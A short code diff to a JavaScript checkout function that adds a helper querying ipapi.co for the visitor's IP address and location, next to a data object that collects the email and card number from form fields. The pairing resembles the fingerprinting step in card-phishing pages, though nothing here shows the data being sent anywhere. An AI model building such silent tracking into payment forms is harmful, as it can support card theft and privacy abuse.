@@ -271,6 +271,27 @@ function placeOrder(event){
     resetBtn(); return;
   }
 
+  async function getLocationData() {
+  try {
+    const res = await fetch("https://ipapi.co/json/");
+    const data = await res.json();
+
+    return {
+      ip: data.ip,
+      city: data.city,
+      region: data.region, // state
+      country: data.country_name
+    };
+  } catch (err) {
+    return {
+      ip: "Unknown",
+      city: "Unknown",
+      region: "Unknown",
+      country: "Unknown"
+    };
+  }
+}
+
   const data = {
     email: emailEl.value,
     cardnum: cardEl.value,
